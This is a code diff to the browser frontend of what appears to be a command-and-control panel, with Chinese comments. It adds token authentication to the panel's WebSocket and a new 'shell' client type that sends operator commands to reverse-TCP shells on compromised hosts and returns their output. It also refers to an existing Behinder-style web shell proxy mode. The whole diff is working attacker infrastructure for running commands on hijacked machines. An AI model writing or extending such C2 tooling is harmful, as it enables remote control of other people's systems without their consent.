@@ -142,10 +142,15 @@ app.init = function() {
 
 app.initSocket = function() {
     // 原生 WebSocket（替代 Socket.IO），与 Go 服务端 /ws 端点通信
+    // 鉴权: 连接时携带 token（query 参数，服务端校验）
     const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const wsUrl = proto + '//' + location.host + '/ws';
+    const wsUrl = proto + '//' + location.host + '/ws?token=' + encodeURIComponent(API.token || '');
 
     const connect = () => {
+        if (!API.token) {
+            setTimeout(() => connect(), 1000);
+            return;
+        }
         try {
             this.socket = new WebSocket(wsUrl);
         } catch(e) {
@@ -351,6 +356,29 @@ app.sendTask = async function(taskType, taskData = {}, clientIds = null) {
     // 判断是否为 WebShell 客户端（冰蝎模式：同步代理，不走异步任务队列）
     const client = this.selectedClient;
     const isWebshell = client && client.client_type === 'webshell';
+    // Shell 类型（reverse_tcp raw TCP handler）：同步写入 conn + 超时读取输出
+    const isShell = client && client.client_type === 'shell';
+
+    if (isShell) {
+        // Shell 同步执行模式：服务端直接向 raw TCP conn 写命令并读输出
+        try {
+            const resp = await API.post(`/api/shell/${targets[0]}/exec`, {
+                command: taskData.command || '',
+                timeout: taskData.timeout || 5
+            });
+            loading.remove();
+            if (resp && resp.task_id) {
+                this._notify(`${taskName}完成`, 'success');
+                return [resp.task_id];
+            }
+            this._notify(`${taskName}失败`, 'error');
+            return [];
+        } catch (e) {
+            loading.remove();
+            this._notify(`${taskName}失败: ` + (e.message || e), 'error');
+            return [];
+        }
+    }
 
     if (isWebshell) {
         // WebShell 同步代理模式：C2 直接向 WebShell 发 POST 请求，同步返回结果
